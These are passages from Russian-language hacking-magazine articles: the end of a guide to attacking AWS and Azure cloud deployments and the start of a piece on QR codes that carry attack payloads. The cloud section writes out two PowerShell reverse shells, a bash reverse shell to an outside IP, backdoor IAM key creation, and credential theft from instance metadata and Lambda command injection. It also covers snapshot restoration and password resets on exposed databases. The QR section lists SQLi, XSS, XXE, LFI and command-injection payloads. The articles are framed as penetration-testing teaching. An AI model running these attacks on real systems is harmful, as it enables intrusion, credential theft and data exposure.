AWS из командной строки и авто матизировать их с помощью скриптов.
   Если утилита AWS уста новлена на скомпрометированной машине, можно
проверить, скон фигурирован ли AWS‐профиль. Конфигурационные данные
к AWS на компьютерах под управлением Linux хра нятся в файле ~/.aws/cre‐
dentials, а в Windows — в C:\Users\USERNAME\.aws\credentials. Этот
файл может содержать данные к учетной записи AWS (access key ID, secret
access key и session token). Полученную таким обра зом учетную запить можно
использовать для удаленного дос тупа в будущем.





             Извле чение данных о конфигурации AWS CLI

С помощью следующих команд AWS CLI мы получим важную информацию
о развернутой в сети облачной инфраструктуре:
 • aws sts getcalleridentity — получить данные об используемой
   учетной записи;
 • aws iam listusers — перечислить всех IAM‐пользователей;
 • aws s3 ls — перечислить все дос тупные AWS S3;
 • aws lambda list functions — перечис лить все lambda‐функции;
 • aws lambda getfunction functionname [function_name] —
   собрать допол нительную информа цию по lambda‐переменным, локации
   и так далее;
 • aws  ec2  describeinstances — перечис лить все доступные вир‐
   туальные машины;
 • aws  deploy  listapplications —  перечислить  все доступные
   веб‐сервисы;
 • aws rds describedbinstances — показать все доступные базы
   данных RDS.





 С помощью одной команды мы можем получить данные о дос тупных
  RDS‐базах

Существуют и другие методы сбо ра информации на скомпрометированной
системе. К примеру, можно воспользовать ся командой history и пос‐
мотреть, какие команды выполнялись за пос леднее вре мя на этой машине.


РАСШИРЕНИЕ ПРАВ И ГОРИЗОНТАЛЬНОЕ ПЕРЕМЕЩЕНИЕ
AWS
Чтобы закрепиться в сис теме, можно соз дать учетную запись с секретными
клю чами и именем iamadmin, которая будет выполнять функцию бэкдора
для атакующего. Для этого воспользуемся командой


aws iam create‐access‐key ‐‐user‐name iamadmin





          Создаем учетную запись для закрепления в системе

С помощью команд SSH можно подключиться к удаленному AWS bucket.





          Подклю чение к AWS bucket с использовани ем SSH

Получается, что боковыми движениями мы заполучили доступ к инфраструк‐
туре AWS. При эксплуатации SSH желательно всегда проверять сле дующие
директории и файлы:
 • .ssh/authorized_keys —  содержит  подпись  публичных  ключей
   для любых авто ризованных клиентов;
 • .ssh/id_rsa — содержит приват ные ключи для клиентов;
 • .ssh/id_rsa.pub — содержит публичные ключи для клиента;
 • .ssh/known_hosts — содержит список подписей хостов.


Azure
Итак, нам удалось найти данные для учет ных записей и собрать достаточно
информации, чтобы понять, что в инфраструктуре Azure присутству ет нес‐
колько виртуальных машин и сервисов. Вир туаль ные машины в Azure очень
похожи на обычные машины, которые работа ют в виртуальной среде,
и  потому  поддерживают  стандартный  набор  команд.  Запустим Nmap
на одной из вир туальных машин AWS.


nmap ‐sS ‐sV ‐v ‐Pn ‐p‐ <IP‐адрес>




              Запускаем Nmap на виртуальной машине

Видно, что на удален ной виртуальной машине работает Apache на 80‐м пор‐
те.  Как  правило,  настройки  доступа  в  среде  Azure  устанавливаются
с помощью правил Azure network group. Так что нуж но быть внимательным
и не забывать менять тестовые нас трой ки. Как оказалось, мы имеем дело
с веб‐приложением для тестирова ния ста туса машин в облаке. Не буду
углубляться в подробности тес тирования веб‐приложе ния, а просто приведу
пример, как уязвимость в веб‐приложении может предоставить доступ к уда‐
ленной виртуальной машине в Azure.
  Для перебора учетных данных использовался DirBuster, который привел
меня на страницу с фор мой логина администратора. Выяс нилось, что при‐
ложение уязвимо к перечислению пользователей и брутфорсу пароля. Сбру‐
тить пароль можно с использованием Burp Suite.





          Форма логина администратора веб‐при ложе ния

Приложение оказалось уязвимым к запуску команды на удаленном компьюте‐
ре.





              Запуск команды на удален ном компь ютере

Видно, что это машина под управлением Windows, на которой можно поп‐
робовать взять шелл. Для начала нужно запус тить слу шателя на машине ата‐
кующего. В качестве примера будет использован netcat: выполним команду
nc ‐lvp 9090, которая запус кает слушателя на порте 9090 и переводит его
в режим ожидания удаленного TCP‐соединения.
  Можно использовать приведенный ниже PowerShell reverse shell либо заг‐
рузить на машину свой собственный шелл, так как этот может быть обнаружен
антивирусами и EDP‐системами. Вот два примера шелла PowerShell, которые
можно использовать на удален ной машине.


Первый шелл
powershell 127.0.0.1&powershell ‐nop ‐c "$client = New‐Object System.
Net.Sockets.TCPClient('IP,9090);$stream = $client.GetStream();[byte[]
]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.
Length)) ‐ne 0){;$data = (New‐Object ‐TypeName System.Text.
ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 |
Out‐String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.
Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"


Второй шелл
$client = New‐Object System.Net.Sockets.TCPClient("IP",9090);$stream
= $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =
$stream.Read($bytes, 0, $bytes.Length)) ‐ne 0){;$data = (New‐Object
‐TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out‐String );$sendback2 = $sendback +
"PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).
GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()};$client.Close()

Как только мы получим шелл, можно приступить к пос тэксплуатации и даль‐
нейшим горизонтальным перемещениям.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
     АТАКА НА ОБЛАКА
           ГАЙД ПО МЕТОДАМ ВЗЛОМА ПРИЛОЖЕНИЙ
                               В AZURE И AWS





Сила Azure Run — берем шелл
Одна из наиболее интерес ных воз можнос тей Azure — это run command, фун‐
кция, которая позволя ет уда ленно выполнять команды без доступа через SSH
или RDP. Run command можно использовать в связ ке с az group list —
командой, перечисляющей группы на ата куемой машине.





                     az group list — перечис лим группы

Для перечисления вир туальных машин в группе используется команда az vm
list ‐g GROUP‐NAME.





                  Перечисляем все VM в группе

Нам удалось найти линуксовую виртуалку, которую можно попробовать про‐
эксплуатировать. Запус тим на ней команду с помощью сле дующей процеду‐
ры:


az vm run‐command invoke ‐g GROUP‐NAME ‐n VM‐NAME ‐‐command‐id
RunShellScript ‐‐scripts "id"





                Запускаем команду на удален ной VM

С  использованием   вот   такой  команды  мы  можем   взять  шелл
на линукс‐машине:


az vm run‐command invoke ‐g bapawsazureresourcegroup2 ‐n test‐vm1
‐‐command‐id RunShellScript ‐‐scripts "bash ‐c \"bash ‐i >& /dev/tcp/
54.243.157.47/9090 0>&1\"

В принципе, все то же самое может быть проделано для машины на базе Win‐
dows. К примеру, можно использовать команду


az vm run‐command invoke ‐g GROUP‐NAME ‐n VM‐NAME ‐‐command‐id
RunPowerShellScript ‐‐scripts "whoami"


МАНИПУЛЯЦИИ НА ЦЕЛЕВОЙ МАШИНЕ И ПОСТЭКСПЛУАТАЦИЯ
AZURE
Кража метаданных с виртуальной машины Azure
Так как у нас уже име ется дос туп к одной из виртуаль ных машин в Azure, мож‐
но попробовать извлечь метаданные. Для этого используем следующую
команду:


curl ‐UseBasicParsing ‐Headers @{"Metadata"="true"} 'http://169.254.
169.254/metadata/instance?api‐version=2017‐08‐01&format=text'





               Извлекаем метаданные с машины Azure

Проверим публичный IP‐адрес узла:


curl ‐UseBasicParsing ‐Headers @{"Metadata"="true"} 'http://169.254.
169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/
publicIpAddress?api‐version=2017‐08‐01&format=text'





                 Проверка пуб лично го IP‐адреса

Если у машины есть доступ в интернет, это сильно облегчит задачу злоумыш‐
ленника. Также можно попробовать собрать данные с помощью OSINT
и использовать их для получения дос тупа извне.


AWS
Кража метаданных из AWS
Так как нам удалось заполучить дос туп к Amazon Elastic Compute Cloud (EC2),
можно атаковать любой из аспектов EC2 — не только веб‐приложения
или службы, но и доступ к самому облачному сервису.


             INFO

                    Во время настройки EC2 юзер получа ет воз‐
                      можность создать пару ключей для SSH. При соз‐
                      дании EC2 в инфраструк туре Windows предос‐
                        тавляется файл для RDP и учет ная запись. Одна
                       из базовых настро ек безопасности — раздел
                        «Группы безопасности», где пользователь может
                       разрешить  доступ  к  определенным  портам
                      и определенным IP‐адресам, что очень похоже
                       на обычный файрвол.


EC2 metadata — это данные об инстанции EC2. Эти данные хранятся
в незашифрованном виде и могут быть извлечены с EC2, если име ется
локальный доступ к машине. Приведу пример, как с помощью уязвимости
в серверной части можно заполучить интерес ную информацию об учетных
записях. Можно  воспользоваться   curl,  чтобы  проверить  метаданные
на инстанции EC2.


curl ‐v http://169.254.169.254/

Вывод этой коман ды выглядит так, как показано на скриншоте ниже.





                    Вывод команды curl

IP‐адрес 169.254.169.254 — это локальный адрес по умолчанию, который
может быть доступен только с самой инстанции. Каждый продукт AWS имеет
свой уникальный ID. Получить его можно с помощью следующей команды:


curl http://169.254.169.254/latest/meta‐data/ami‐id

Чтобы проверить публичный адрес EC2, используй команду


curl http://169.254.169.254/latest/meta‐data/public‐hostname

Команда Ec2‐metadata дает возможность прос мотреть общие метаданные
EC2.





                    Просмотр метаданных EC2

Чтобы узнать публичный IP‐адрес, используй команду Ec2‐metadata  ‐v.
Имея публичный адрес, можно выполнить ата ку извне. Для начала стоит про‐
верить, доступен ли IP, с использованием Nmap.





                Исследуем хост с помощью Nmap

Оказывается, на хосте работа ет SSH, к тому же уязвимая версия. Это под ска‐
зывает нам еще несколь ко воз можных векторов атак.


Кража учетной записи IAM и настройка удаленного доступа
Чтобы узнать данные IAM, используй команду вида


curl http://169.254.169.254/latest/meta‐data/iam/info

Получить рас ширенные данные, включающие accessID, SecretAccessKey, To‐
ken, позволяет команда


curl http://169.254.169.254/latest/meta‐data/iam/
security‐credentials/ec2acess





                    Получение данных IAM

Для успешной атаки с помощью учетной записи IAM нужно иметь следующие
данные:
 • aws_access_key_id;
 • aws_secret_access_key;
 • aws_session_token.

Чтобы настроить скомпро метированный IAM‐акка унт для удаленного доступа,
для начала нужно создать новый профиль с исполь зовани ем краденых дан‐
ных:


aws configure ‐‐profile hackme





      Создаем «левый» про филь с использованием краденых данных

Профиль создан, но еще нужно добавить токен для полноценной работы уда‐
ленного доступа. Его можно прописать вручную, изменив файл ~/.aws/cre‐
dentials.




     Прописываем токен для нормальной работы удаленного доступа

На одной машине можно соз дать неограниченное количество профилей,
главное — не меняй профиль по умолчанию.


AWS — выполнение действий на машине с помощью nimbostratus
Nimbostratus был создан как утилита тестирова ния в AWS. Но эта тулза может
использоваться для кражи учетных данных на скомпрометированных EC2,
кражи метаданных, для создания IAM‐пользователя, работы с образами RDS
и многих других задач. Например, можно получить метаданные с исполь‐
зованием nimbostratus следующим способом:


python nimbostratus dump‐ec2‐metadata





        Получение метаданных с использовани ем nimbostratus


ЭКСПЛУАТАЦИЯ СЕРВИСОВ
Эксплуатация уязвимости в AWS Lambda
AWS Lambda — это плат форменная услуга Amazon Web Services, предос‐
тавляется она по прин ципу «функция как услуга». На что стоит обратить вни‐
мание при тестировании AWS Lambda?
 • Доступ к Lambda предоставляется через сетевой шлюз (gateway) или же
   через AWS‐триггеры.
 • Чаще уязвимости обнаруживаются при тес тировании на инъ екции, фаз‐
   зинге и мисконфигура циях серверной части.

Например, при вводе точки с запятой в строку для URL и какой‐либо команды
видно, что эта команда исполняется из‐за наличия уязвимости на стороне
сервера.



           Эксплуата ция командной инъекции в AWS Lambda

Например, запустить команду id на уда ленной машине можно сле дующим
образом.


curl https://8o9kujtxv3.execute‐api.us‐east‐1.amazonaws.com/api/hack;
id;w

А с помощью следующей команды можно заг лянуть в /etc/passwd.


curl https://API‐endpoint/api/hello;cat%20%2fetc%2fpasswd;w

Чтобы скопировать эту информа цию в текстовый файл, используем сле‐
дующую директиву.


curl https://8o9kujtxv3.execute‐api.us‐east‐1.amazonaws.com/api/hack;
cat%20%2fetc%2fpasswd;w > pass.txt

Еще одна важная особенность Lambda — это временный токен, который пре‐
доставляется в виде переменной среды. Его можно проверить командой
printenv:


curl https://8o9kujtxv3.execute‐api.us‐east‐1.amazonaws.com/api/hack;
printenv;w

Когда учетные данные AWS укра дены и добавлены в интерфейс командной
строки AWS, можно попытаться загрузить lambda‐код. Это необходимо, если
ты хочешь узнать, какие lambda‐функции выполняются в целевой среде, а так‐
же попытаться найти конфиденциальную информацию.
  Перечислить lambda‐функции, которые дос тупны для текуще го профиля,
можно с помощью команды aws lambda list‐functions. Ее вывод показан
на следующем скрин шоте.





  Перечисляем lambda‐функции, которые дос тупны для текущего профиля

Чтобы получить ссылку на загрузку lambda‐функции, используй эту команду:


aws lambda get‐function ‐‐function‐name <FUNCTION‐NAME>

Как только код будет загружен на твою машину, можно проверить, содержит
ли он уязвимости и конфиденциальную информацию.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
     АТАКА НА ОБЛАКА
           ГАЙД ПО МЕТОДАМ ВЗЛОМА ПРИЛОЖЕНИЙ
                               В AZURE И AWS





Эксплуатация облачных хранилищ в AWS
Облачные  хранилища наиболее  интерес ны  для  злоумышленника. AWS
S3 и EBS (Elastic Block Store) довольно часто содержат уязвимости и неп‐
равильные  конфигурации, которые  могут быть обнаружены при сборе
информации о цели.
  AWSBucketDump — это инс трумент для быстрого сбора данных о AWS S3.
Он очень похож на SubBrute, так как работа ет по ана логичной схе ме и брут‐
форсит AWS S3. Кроме того, в AWSBucketDump есть фичи, которые помогают
автоматизировать поиск и загрузку интерес ной информации. Для запуска
AWSBucketDump используется следующая команда:


python AWSBucketDump.py ‐D ‐l BucketNames.txt ‐g s.txt

Скрипт создаст файл interesting_file.txt, в котором сохранятся резуль‐
таты его работы.





  Скрипт AWSBucketDump собрал интересные данные и сохранил их в тек‐
  стовый файл

А как узнать, существует ли вообще интересу ющее нас хранилище S3? Мож‐
но выбрать любой AWS URL и проверить HTTP response. Существу ющая кор‐
зина вернет нам ListBucketResult или AccessDenied.





                  Проверяем, сущес твует ли S3

Если HTTP Response на $ bucket.s3.amazonaws.com показывает NoSuch‐
Bucket, это означает, что корзина не существу ет.





                         Такого объ екта нет

С помощью утилиты AWS можно запрашивать данные о S3 ACL: для этого
используется команда aws s3api get‐bucket‐acl ‐‐bucket bucket‐name.





                Результат работы коман ды aws s3api

Для объектов, которые имеют открытый доступ на чте ние и запись, в ACL
будет указано FULL_CONTROL. Ты можешь соз давать файлы в такой корзине
удаленно, используя любую  учетную запись AWS. Можно залить файл
при помощи утилиты aws с использованием любого профиля, а потом про‐
верить наличие это го файла:


aws s3 cp readme.txt s3://bucket‐name‐here ‐‐profile newuserprofile
aws s3 ls s3://bucket‐name‐here ‐‐profile newuserprofile

Вот как эта операция выглядит в консоли.





                   Залива ем и проверяем файл

Amazon Elastic Block Store (Amazon EBS) предос тавляет постоянные тома
блочных хранилищ для использования с Amazon EC2 в облаке AWS. Каждый
том Amazon EBS автоматически реплициру ется в своей зоне доступности.
Чтобы обнаружить общедоступные снимки EBS с определенными паттерна‐
ми, можно использовать grep:


aws ec2 describe‐snapshots ‐‐region us‐east‐1
‐‐restorable‐by‐user‐ids all | grep ‐C 10 "company secrets"





                   Результат исполь зования grep

Получить зону доступнос ти и ID EC2 позволяет следующая команда:


aws ec2 describe‐instances ‐‐filters Name=tag:Name,Values=
attacker‐machine

Теперь можно создать новый том с использованием обнаруженного снап‐
шота:


aws ec2 create‐volume ‐‐snapshot‐id snap‐03616657ede4b9862
‐‐availability‐zone us‐east‐1b

После создания тома обра ти внимание на VolumeID. Можно под ключить соз‐
данный нами новый том к компьютеру EC2 с исполь зованием ID‐инстанции
EC2 и ID нового тома. Для это го использует ся следующая команда:


aws ec2 attach‐volume ‐‐device /dev/sdh ‐‐instance‐id
i‐05a977acccaa51bd6 ‐‐volume‐id vol‐018bd5c117c410f23





                Подключаем вновь соз данный том

Для проверки состояния служит команда aws ec2 describe‐volumes ‐‐
filters  Name=volume‐id,Values=vol‐018bd5c117c410f23 — если  все
в порядке, сервер ответит in use.





                  Проверка подключенного тома

Когда том подключен, мож но определить раздел с помощью lsblk и смон‐
тировать его для дальнейшего анализа.


Реляционные базы данных AWS
Облачные базы данных в случае с AWS — это служба реляционных баз дан‐
ных, которая позволяет пользователям соз давать базы в облаке и подклю‐
чаться к ним из любого места. Нередко в конфигура ции БД допускают ошиб‐
ки, которые могут использовать ата кующие.
   Чаще всего неправиль ные конфигура ции включают в себя слабую полити‐
ку безопасности и слабые пароли, что делает RDS общедоступным.
  Ниже приведен пример эксплуата ции слабого пароля и ролей дос тупа:
при эксплуатации веб‐приложения уда лось най ти SQL‐инъ екцию и заполу‐
чить хеши пользователя.





          Получение хешей с использованием SQL‐инъ екции

Определить тип хеша можно с помощью утилиты hash‐identiﬁer. Например, мы
можем  запустить  hashcat,  чтобы подоб рать  пароль  для  пользователя
rdsroot, следующей командой:


hashcat ‐m 300 ‐a 0 D1DBA23DC29396BCDAE208D3AF7AF9F065CF3CC4
wordlist.txt

Подключиться к базе данных можно, используя обычный клиент MySQL.





                  Подключаемся к базе данных

Как только доступ к RDS получен, можно попытаться дампнуть базу данных.
Есть много способов этого достичь c помощью SQL‐инъ екции или через
AWS‐консоль, которая поз воляет монтировать RDS‐образ. Для получения
доступа к данным можно сбросить пароль этих обра зов.
  Снимки RDS могут быть дос тупны извне. Если доступен ID образа, этот
образ может быть смонтирован на машину, с которой производится атака.
Найти нужный ID поможет утилита AWS, команда вот такая:


aws rds describe‐db‐snapshots ‐‐include‐public ‐‐snapshot‐type public
 ‐‐db‐snapshot‐identifier arn:aws:rds:us‐east‐1:159236164734:
snapshot:globalbutterdbbackup





            Ищем ID образа с помощью ути литы AWS

Чтобы восстановить образ как новую инстанцию, используем следующую
команду:


aws rds restore‐db‐instance‐from‐db‐snapshot ‐‐db‐instance‐identifier
 recoverdb ‐‐publicly‐accessible ‐‐db‐snapshot‐identifier arn:aws:
rds:us‐east‐1:159236164734:snapshot:globalbutterdbbackup
‐‐availability‐zone us‐east‐1b

Как только образ восста новлен, мож но проверить, все ли работает, а потом
попробовать подключиться:


aws rds describe‐db‐instances ‐‐db‐instance‐identifier recoverdb

Параметр DBInstanceStatus показывает ста тус инстанции. Как только бэкап
завершится, значение DBInstanceStatus станет available.





                   Проверяем ста тус объ екта

Теперь можно сбросить пароль для MasterUsername и залогиниться:


aws rds modify‐db‐instance ‐‐db‐instance‐identifier recoverdb
‐‐master‐user‐password NewPassword1 ‐‐apply‐immediately

Проверить, работает ли MySQL RDP и раз реша ет ли подключения, можно
с помощью команды nc rds‐endpoint 3306 ‐‐zvv. Чтобы подключиться
к базе данных и извлечь данные из нее, чаще всего используют обычный кли‐
ент MySQL.


ОБЛАЧНОЕ ХРАНИЛИЩЕ AZURE
Azure Storage предоставляет облачное хранилище, которое включает в себя
объекты Azure drops, хра нилища data lake, файлы, очереди и таблицы. Неп‐
равильные конфигурации могут привести к утечке конфиденциальных данных
и потенциальному риску других сервисов.
   Azure drops являются эквивалентом AWS S3 и позволяют хранить объекты.
Доступ к этим объектам может быть получен через HTTP с использованием
созданного URL.
  На приведенной ниже картинке можно уви деть пример неправильных кон‐
фигураций прав доступа к файлам в хра нилище Azure.





  Пример неправильной конфигура ции прав доступа к файлам в хранили‐
  ще Azure

Неправильные привилегии поз воляют увидеть, какие файлы хранятся в Azure
drops, а также дают возможность уда лять файлы. В результате могут быть
потеряны конфиденциальные данные и нарушена работос пособность дру гих
сервисов.
  Адрес Azure drops представляет собой FQDN, который явля ется полным
доменным именем и содержит запись типа A. Она, в свою очередь, указывает
на принадлежность к IP‐адресу Microsoft. Поэтому для поиска объ ектов Azure
drops можно использовать любой инстру мент перечисления поддоменов,
который проверяет либо наличие записи A для доменного имени, либо коды
состояния HTTP.
  Можно использовать такие утилиты, как dnsscan. Для достижения лучшего
результата желательно использовать собственные словари. С базовым сло‐
варем поиск поддоменов выполняется такой командой:


python dnsscan.py ‐d blob.core.windows.net ‐w subdomains‐100.txt

Результат ее работы показан на следующей иллюс тра ции.





              Поиск поддоменов с помощью dnsscan

Нетрудно отыскать и доступные из сети облачные базы данных Azure. Имя
конечной точки сер вера базы данных SQL Azure имеет вид ??.database.win‐
dows.net. Поиск в интернете для этой конкрет ной строки может дать инте‐
ресные результаты. По сути, имена конечных точек базы данных и потен‐
циальные учетные записи можно найти с помощью Google или поиска под‐
доменов.


ЗАКЛЮЧЕНИЕ
Если ты перенес инфраструктуру в обла ко, это не значит, что можно пол‐
ностью забыть обо всех проблемах, связанных с безопас ностью. Они никуда
не исчезли. В этой статье мы рас смотрели основные приемы, которые хакеры
могут использовать при атаках на приложения, расположенные в Azure. Эти
знания помогут тебе избежать основных рисков, но никто не угадает, когда
появятся новые. Так что расслабляться не сто ит!
  В гибридной облачной среде, где некоторые данные хранятся локально,
а некоторые в облаках, к вопросам ИБ следует подходить комплексно. И тес‐
тирование на проникновение — наилучший способ оценить, насколько
хорошо решены вопросы защиты данных. Оно поз воляет выявить слабые эле‐
менты, способные поставить под угрозу защиту всей инфраструктуры орга‐
низации. Защита от утечки данных и соб людение правил безопасности тре‐
буют постоянной бдительности.


        WWW

                       •Статья о  пассивном  сборе  данных  в AWS
                         из блога Rhino Security Labs
                     •Коллекция шпаргалок  для  проведения  тес‐
                         тирования на проникновение в облаке
                    •Подборка постов  в блоге компании  NetSPI
                        по теме тестирования Azure
                    •Подборка материалов по аудиту безопасности
                         в облаке
                     •Слайды к лекции Рияза Валикара о пентесте
                       лямбда‐функции
                       •Статья   об   исследовании   безопасности
                        облачных сервисов S3, IAM и EC2 в блоге Virtue
                             Security
ВЗЛОМ





    ВКУРИВАЕМ

             КАК СДЕЛАТЬ QR‐КОД
               С СЮРПРИЗОМ           QR





QR‐код  сейчас  совершенно  обыденная
вещь —  они  встречаются  повсюду,  их
используют как один из способов авториза‐
ции  крупные  сервисы  вро де  WhatsApp,
Яндекса и AliExpress, встречаются QR‐коды           FantomGuard                                                                                          fantom‐guard@yandex.ru
для подключения  к  Wi‐Fi. Но насколько
надежна эта технология? Можно ли создать
такой QR‐код, при сканировании которо го
выполнится нагрузка на девайсе жертвы?
Этот вопрос мы сегодня разберем под‐
робнее.


QR‐код (англ. Quick Response Code — код быс трого реагирования) —
это  матричный  или  двумерный  штрих‐код,  который  может  содержать
до 4296 символов ASCII. То есть, проще говоря, картинка, в которой зашиф‐
рован текст.


ИСТОРИЯ ВЕКТОРА АТАКИ
В мае 2013 года специалис ты компании по сетевой безопасности Lookout
Mobile разработали специальные QR‐коды, которые смогли скомпромети‐
ровать очки Google Glass. На тот момент очки ска нировали все фотографии,
«которые могут быть полез ны их владельцу», — и предоставили взломщикам
полный удаленный доступ к устройству. Исследова тели сообщили в Google
о данной  уязвимости, и ее  закрыли  букваль но  за нес колько  недель.
К счастью, исправить успели до того, как ее можно было использовать вне
лаборатории, ведь взлом очков реального пользователя мог привести к боль‐
шим проблемам.
  В 2014 году программа Barcode Scanner для мобильных устройств из про‐
екта ZXing практически не проверяла тип URI, передаваемый через QR‐код.
В результате любой экспло ит, который мог быть исполнен браузером (нап‐
ример, написанный на JavaScript), можно было передать через QR.
   Сканер пытался отфиль тровать опасные виды атак с помощью регулярных
выражений, тре буя, чтобы URI имел период с пос ледующим продлением
как минимум на два символа, транспортный про токол длиной не менее двух
символов, за которым следует двоеточие, и чтобы в URI не было пробелов.
   Если содержимое не соот ветс твует хотя бы одному из требований, то оно
определяется как обычный текст, а не URI. Этот механизм блокирует атаки
вроде javascript;alert("You have won 1000 dollars! Just Click The
Open  Browser  Button");, но, внеся пару простых изменений в код, мы
получаем вариант, который программа исполняла в браузере, ведь она счи‐
тала JS‐код обыкновенным, «нормальным» URI!
   Вот как это выглядело.





   Вариант кода, который блокировался защитным механиз мом сканера





   Модифицированный URI, который прог рамма не могла отфильтровать





Как мы можем увидеть, уведомление появилось в браузере, а значит, URI
с потенциально вредонос ным кодом был выполнен. Однако выполняется дан‐
ный JS‐код лишь тогда, когда пользователь нажимает Open Browser (то есть
«Открыть в браузере»).
  Еще один интересный пример из 2012 года: эксперт по информационной
безопасности Равишанкар Боргаонкар (Ravishankar Borgaonkar) продемонс‐
трировал, как сканирование прос тейшего QR может привести к форматиро‐
ванию устройств Samsung! Что же было  внутри? MMI‐код для сброса
до заводских настроек: *2767*3855#, а также префикс tel: для совершения
USSD‐запроса.
  Самое опасное здесь — что человек без предварительной подготовки
не может узнать содержимое кода, не отска ниро вав его. А человек очень
любопытен: в различных исследова ниях большинство испы туемых (которые,
кстати, даже не знали об эксперименте) ска нировали QR‐код именно
из любопытства, забывая о собственной безопас ности. Поэтому всегда будь
внимателен!


        WWW

                      Если у тебя нет сканера кодов, но уйма сво бод‐
                        ного времени — можно поп робовать расшифро‐
                         вать код вручную. Инструкция есть на Хаб ре.



QRGEN — КАЖДОМУ ПО КОДУ
Для демонстрации средств работы с QR‐кодами я буду использовать Kali
Linux 2019.2 с установленным Python версии 3.7 — это необходимо для кор‐
ректной работы утилит.


           WARNING

                    Не  забывай  про  уголовную  ответственность
                        за  создание и распространение вредоносных
                       программ, к которым в широком смысле относят‐
                        ся и наши «заряженные» QR‐коды.


Начнем с утилиты QRGen, которая позволяет соз давать QR‐коды с закоди‐
рованными в них скриптами. Копируем репозиторий и переходим в папку
с содержимым.


git clone https://github.com/h0nus/QRGen
cd QRGen && ls


             INFO

                   QRGen требует Python версии 3.6 и выше. Если
                       возникает ошибка, поп робуй обно вить интерпре‐
                          татор.


Устанавливаем все зависимости и запускаем сам скрипт.


pip3 install ‐r requirements.txt
# или python3 ‐m pip install ‐r requirements.txt
python3 qrgen.py

Видим справку.





                         Справка QRGen

Аргумент ‐h выведет то же самое, а вот запуск с ключом ‐l приведет
к генерации QR‐кодов из определен ной категории. Всего их восемь.
 1. SQL‐инъекции.
 2. XSS.
 3. Инъекции команд.
 4. QR с форматированной строкой.
 5. XXE.
 6. Фаззинг строк.
 7. SSI‐инъекции.
 8. LFI или получение доступа к скрытым катало гам.


Возможные атаки
Теперь давай посмотрим на примеры из каж дой категории, а также раз‐
беремся, какой урон и каким устройствам они могут нанести.


1. 0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z
2. <svg onload=alert(1)>
3. cat /etc/passwd
4. %d%d%d%d%d%d%d%d%d%d
5. <!ENTITY % xxe SYSTEM "php://filter/convert.base64‐encode/
resource=/etc/passwd" >
6. "A" x 33
7. <pre><!‐‐#exec cmd="ls" ‐‐></pre>
8. ../../../../../../etc/passwd

Посмотреть текстовые файлы со всеми вари анта ми «начинки» QR‐кодов ты
можешь в папке words (они раз делены по категориям, указанным выше).
   Теперь пара слов о последс твиях атак подоб ными нагрузками.
  Первый класс атак — SQL‐инъ екции — используют при взломе БД
и нарушении работы веб‐сайтов. Например, запрос может вызывать зависа‐
ние сайта.
  Следующий пример (под номером 2) демонс трирует эксплуатацию XSS‐
уязвимости при атаке на веб‐приложения с использованием SVG (Scalable
Vector Graphic). К чему может привести XSS, ты, думаю, и без меня прекрасно
знаешь, так что подробно на этом останавливать ся не буду.
   Третий пункт выводит на экран жертвы содержимое файла /etc/passwd:
список аккаунтов Linux‐based‐систем и дополнительную информацию о них
(раньше — хеши паролей этих учетных записей). В подобных слу чаях обычно
стараются получить /etc/shadow и конфигурацию сервера, но все очень
сильно зависит от цели, так что какие фай лы читать — решай сам.
   Четвертый пример представляет собой выражение, которое вызовет
переполнение буфера (buﬀer overﬂow). Оно возникает, когда объем данных
для записи или чтения больше, чем вмещает буфер, и способно вызвать ава‐
рийное завершение или зависа ние программы, ведущее к отказу в обслу‐
живании (denial of service, DoS). Отдельные виды перепол нений дают зло‐
умышленнику возможность загрузить и выполнить произвольный машинный
код от имени программы и с правами учетной записи, от которой она выпол‐
няется, что делает эту ошибку довольно опас ной.
  Пятый по счету класс атак (XXE Injections) представляет собой вариант
получения скрытой информации веб‐сервера с помощью анализа вывода
XML‐файлов. Конкретно в нашем примере при запросе к серверу тот ответит
зашифрованным в Base64 содержимым файла /etc/passwd, который уже
упоминался. Однако расшифровать его не сос тавит труда — дос таточно
лишь воспользоваться встроенной в большинство дистрибутивов Linux ути‐
литой base64 либо же онлайн‐конвертером.
   Атаки форматной стро ки (пример 6) — это класс уязвимостей, который
вклю чает в себя предос тавление «специфичных для языка маркеров фор‐
мата» для выполнения произвольного кода или сбоя программы. Говоря
человеческим языком, это класс атак, при которых при ложе ние некорректно
очищает пользовательский ввод от управляющих конс трукций, из‐за чего эти
конструкции в результате исполняются. Если ты программировал на С, то,
конечно, помнишь те интерес ности с выводом переменных через printf:
надо было в первом аргументе (который строка) указать на тип выводимого
значения (%d для десятичного числа и так далее).
  Седьмой пункт представляет собой вари ант command injection, которая
выпол няет определен ный код на стороне сервера. В моем примере будет
выпол нена команда ls, которая покажет содер жимое текущей директории,
но, конечно, там может быть гораздо более опас ный код.
  И наконец, последняя категория — это LFI‐уязвимости (Local File Inclusion;
вклю чение локальных файлов), позволяющие прос мотреть на уязвимых (или
неправильно настроенных) серверах файлы и пап ки, которые не дол жны были
быть видны всем. Один из воз можных вариантов — просмотреть файл /etc/
passwd, о котором мы с тобой уже не раз говорили. Это может выглядеть вот
так.





Обрати внимание, что в качес тве тестового веб‐приложения используется
DVWA (Damn Vulnerable Web Application), который был специально разработан
для обучения пентесту. Многие ата ки на веб‐приложе ния можно отработать
на нем.


Практика
А сейчас перейдем к практике — про тес тируем эту утилиту сами.
  Например, запустим ее с ключом ‐l 5:


python3 qrgen.py ‐l 5

Утилита сгенерировала 46 QR‐кодов с полезными нагрузками. Все они лежат
в папке genqr.





Каждый из них содержит вредоносный код, поэтому хоть я и при веду пример,
но часть его будет вырезана.





Теперь можем запустить скрипт с флагом ‐w (напомню, он заставляет скрипт
использовать кастомный словарь), но сначала нам нужен файл с нашими
полезными (и не очень) нагрузка ми. Можем исполь зовать готовые нагрузки
